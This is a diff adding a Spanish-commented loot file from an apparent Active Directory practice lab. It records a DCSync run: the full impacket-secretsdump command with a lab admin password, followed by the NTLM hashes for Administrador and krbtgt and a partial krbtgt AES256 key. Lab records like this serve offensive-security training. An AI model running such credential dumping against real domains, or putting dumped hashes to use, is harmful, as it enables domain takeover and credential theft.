@@ -1,0 +1,14 @@
+# Loot Lab-01 GHOST FOREST — DCSync via secretsdump
+# Obtenido via: impacket-secretsdump atackcorp.local/Administrador:'NuevaPassword2026!'@10.0.2.10
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrador:500:aad3b435b51404eeaad3b435b51404ee:b73fdfe10e87b4ca5c0d957f81de6863:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d5237a2e43cb315c90679e2a5dae34ad:::
+
+# krbtgt AES256
+krbtgt AES256: 2f123c9bb0d3fadaa6b09592d0a5be11...
+
+# Crown Jewels
+# Administrador NTLM : b73fdfe10e87b4ca5c0d957f81de6863
+# krbtgt NTLM        : d5237a2e43cb315c90679e2a5dae34ad
